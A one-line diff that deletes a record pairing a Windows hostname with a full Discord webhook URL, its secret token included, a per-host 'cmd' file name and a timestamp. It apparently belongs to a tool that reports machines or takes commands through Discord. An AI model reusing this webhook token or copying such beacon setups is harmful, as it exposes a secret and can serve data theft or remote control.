@@ -1,1 +1,0 @@
-setup:DESKTOP-8DS1G29:https://discord.com/api/webhooks/1563861334003552300/3B75SvdrBZz3LI3fY61mHUOMB9GSfWQST4nqUQM7IAb-PPUWx_p6beU0xg9ldtBYkMmA;cmd-desktop-8ds1g29.txt|1792923997
